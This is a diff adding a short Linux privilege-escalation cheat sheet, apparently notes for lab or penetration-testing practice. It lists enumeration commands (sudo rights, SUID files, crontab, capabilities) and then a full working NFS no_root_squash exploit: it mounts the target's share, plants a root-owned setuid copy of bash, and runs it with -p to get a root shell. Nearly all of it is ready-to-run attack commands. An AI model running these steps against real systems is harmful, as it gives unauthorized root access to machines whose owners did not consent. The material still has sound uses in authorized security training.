@@ -1,0 +1,39 @@
+sudo -l
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+cat /etc/crontab
+
+getcap -r / 2> /dev/null
+
+$PATH
+
+LD_PRELOAD
+
+exploits
+
+# NFS mounts requires 'no_root_squash' on one of the mount shares
+## you can check mount shares on the machine:
+cat /etc/exports
+## or remotely (-e stands for exports)
+showmount -e $ip
+
+## to mount an NFS share on your local file system first:
+mkdir /tmp/ha
+## then either:
+sudo mount -t nfs $ip:/home/ubuntu/sharedfolder /tmp/ha/
+## or
+mount -o rw $ip:/home/ubuntu/sharedfolder /tmp/ha
+
+## copy bash executable (binary) from the remote machine to your local machine and prepare it
+scp -i ./id_rsa username@$ip:/bin/bash /home/user1/Downloads
+mv /home/user1/Downloads/bash /tmp/ha
+cd /tmp/ha
+sudo su
+chown root:root bash
+chmod +s bash
+
+## then ssh into the remote machine and run (-p saves priviledges without it root priviledges are dropped)
+./bash -p
+
+
